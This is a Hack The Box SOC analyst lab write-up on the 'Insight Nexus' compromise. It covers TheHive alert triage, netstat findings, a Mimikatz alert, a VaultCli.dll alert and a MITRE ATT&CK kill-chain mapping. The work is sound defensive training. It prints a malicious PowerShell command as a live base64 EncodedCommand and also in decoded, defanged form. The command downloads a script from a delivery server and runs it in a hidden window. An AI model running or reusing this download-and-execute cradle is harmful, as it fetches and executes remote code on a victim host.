# HTB SOC Analyst Lab — Insight Nexus: Alert Triage & Kill Chain Mapping

## Overview

This section covers the second part of the Insight Nexus investigation, focusing on alert triage in TheHive, log analysis, IOC extraction, and mapping the attack to the Cyber Kill Chain and MITRE ATT&CK framework.

---

## Task 1 — Alert Triage in TheHive

A new case was created in TheHive titled **"Insight Nexus — ManageEngine Compromise"** and all related alerts were linked to it.

Alerts linked to the case:

| Alert ID | Description |
|---|---|
| INX-ALERT-2025-00077 | Admin Login via ManageEngine Web Console |
| INX-ALERT-2025-00078 | Hacker tool Mimikatz detected |
| INX-ALERT-2025-00079 | Suspicious process loaded VaultCli.dll module |

**Steps taken:**
- Assigned the case to myself as the handling analyst
- Set priority to **Critical** due to confirmed credential dumping and C2 activity
- Merged alert `INX-ALERT-2025-00077` (ManageEngine admin login) into the Mimikatz alert case as both were linked to the same attacker IP `103[.]112[.]60[.]117`

---

## Task 2 — Triage, Enrichment & Correlation

### Observables Added

| Type | Value | Context |
|---|---|---|
| IP | `103[.]112[.]60[.]117` | Attacker C2 / ManageEngine login source |
| IP | `172[.]16[.]30[.]18` | Internal host involved in lateral movement |
| IP | `198[.]51[.]100[.]24` | Malware delivery server |
| IP | `203[.]0[.]113[.]18` | C2 server (confirmed via netstat) |
| Hostname | `DEV-021[.]insight[.]local` | Misconfigured RDP workstation |
| Hostname | `manage[.]insightnexus[.]com` | Compromised ManageEngine portal |
| Tool | `mimikatz.exe` | Credential dumping tool executed by `insight\svc_deployer` |

### Alert Notes — Netstat Finding (Task 3)

The following `netstat -ano` output was captured on `VICTIM-HOST-01` (IP: `10.10.5.23`) at approximately 15:42:35 after the host rejoined the domain. Despite recovery, the host was still communicating with external IPs.
Proto  Local Address          Foreign Address        State           PID
TCP    127.0.0.1:5357         0.0.0.0:0              LISTENING       928
TCP    10.10.5.23:139         0.0.0.0:0              LISTENING       4
TCP    10.10.5.23:52344       198.51.100.24:443      ESTABLISHED     5420
TCP    10.10.5.23:52345       203.0.113.18:4444      ESTABLISHED     1340
UDP    10.10.5.23:123         :                                    1320
TCP    10.10.5.23:49678       10.10.5.17:445         ESTABLISHED     5420
TCP    10.10.5.23:49679       10.10.5.18:445         TIME_WAIT       5420

**Key findings from netstat:**
- PID `5420` maintains an ESTABLISHED connection to `198[.]51[.]100[.]24:443` — the malware delivery server
- PID `1340` maintains an ESTABLISHED connection to `203[.]0[.]113[.]18:4444` — confirmed C2 server communicating over a non-standard port
- PID `5420` also connecting internally to port 445 on two hosts — indicating active SMB lateral movement
- The host rejoined the domain but the malware persisted and continued beaconing, confirming the persistence mechanism was not fully cleaned

**Validated IOCs:**

| IOC | Type | Confirmed |
|---|---|---|
| `198[.]51[.]100[.]24` | Malware delivery server | Yes — active HTTPS connection post-recovery |
| `203[.]0[.]113[.]18` | C2 server | Yes — active connection on port 4444 post-recovery |

---

## Task 3 — Log Analysis & IOC Extraction

### PowerShell Command Decode

A suspicious encoded PowerShell command was detected in the logs on `VICTIM-HOST-01`, executed by `CORP\svc-update`.

**Raw encoded command:**
-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvZGVwbG95LWRlZmluaXRpb25zLnBzMScpOyBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAnLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XFdpbmRvd3NcVGVtcFxkZXBsb3ktZGVmaW5pdGlvbnMucHMxJw==

**Decoded:**
```powershell
IEX (New-Object System.Net.WebClient).DownloadString('hxxp://198[.]51[.]100[.]24/defender/deploy-definitions.ps1');
Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'
```

**Analysis:** The command uses `IEX` (Invoke-Expression) to download and execute a PowerShell script directly from the malware delivery server `198[.]51[.]100[.]24`, disguising it as a Windows Defender definition update. The script is saved to `C:\Windows\Temp\` and executed in a hidden window to avoid detection.

**Extracted IOCs:**

| IOC | Type | Description |
|---|---|---|
| `198[.]51[.]100[.]24` | IP | Malware delivery server |
| `hxxp://198[.]51[.]100[.]24/defender/deploy-definitions.ps1` | URL | Malicious PowerShell script download URL |
| `C:\Windows\Temp\deploy-definitions.ps1` | File path | Dropped malicious script |
| `CORP\svc-update` | User account | Account used to execute the command |

**Supporting Log Evidence:**

```json
{
  "agent": { "name": "VICTIM-HOST-01.corp.local", "ip": "10.10.5.23" },
  "timestamp": "2025-10-08T10:12:30.123Z",
  "rule": {
    "level": 12,
    "description": "Suspicious PowerShell execution with EncodedCommand (possible downloader/obfuscation)",
    "id": "34012"
  },
  "data": {
    "win": {
      "system": { "eventID": "1" },
      "eventdata": {
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SUVYICh...",
        "ParentImage": "C:\\Windows\\system32\\services.exe",
        "User": "CORP\\svc-update",
        "ProcessId": "5420"
      }
    }
  }
}
```

### Mimikatz Alert Log

```json
{
  "agent": { "name": "SCDC01", "ip": "172.16.200.50" },
  "timestamp": "2025-10-08T18:25:36.024629Z",
  "rule": {
    "level": 10,
    "description": "Possible credential dumping detected (Mimikatz execution)",
    "id": "92111"
  },
  "data": {
    "win": {
      "system": { "eventID": "4688" },
      "eventdata": {
        "subjectUserName": "Administrator",
        "newProcessName": "C:\\Users\\Administrator\\Downloads\\mimikatz.exe",
        "parentProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "subjectDomainName": "INSIGHTNEXUS"
      }
    }
  }
}
```

### VaultCli.dll Alert

A third alert was linked to the case: **"Suspicious process loaded VaultCli.dll module. Possible use to dump stored passwords."**

`VaultCli.dll` is a Windows credential vault library. Its loading by a suspicious process is a strong indicator of credential theft targeting stored browser passwords, RDP credentials, and Windows credential manager entries.

**MITRE Technique ID:** `T1003` — OS Credential Dumping

---

## Task 4 — Cyber Kill Chain & MITRE ATT&CK Mapping

### Attack Scenario Mapped

> A user opens an attachment, which executes a downloader that writes an .exe file to `%AppData%`, creates a `Run` registry key, and later loads `VaultCli.dll` via a suspicious tool, exfiltrating credentials to an external IP.

| Kill Chain Phase | Activity | MITRE Technique | ID |
|---|---|---|---|
| Delivery | User opens malicious attachment | Spearphishing Attachment | T1566.001 |
| Exploitation | Attachment executes downloader | User Execution: Malicious File | T1204.002 |
| Installation | Downloader writes .exe to `%AppData%` | Ingress Tool Transfer | T1105 |
| Installation | Creates `Run` registry key for persistence | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| Actions on Objectives | Loads `VaultCli.dll` to dump credentials | OS Credential Dumping | T1003 |
| Actions on Objectives | Mimikatz executed for credential dumping | OS Credential Dumping: LSASS Memory | T1003.001 |
| Actions on Objectives | Credentials exfiltrated to external IP | Exfiltration Over C2 Channel | T1041 |
| Command & Control | Beaconing to `203[.]0[.]113[.]18:4444` | Application Layer Protocol | T1071 |
| Command & Control | Malware delivery from `198[.]51[.]100[.]24` | Ingress Tool Transfer | T1105 |

---

*Completed as part of the Hack The Box SOC Analyst learning path.*
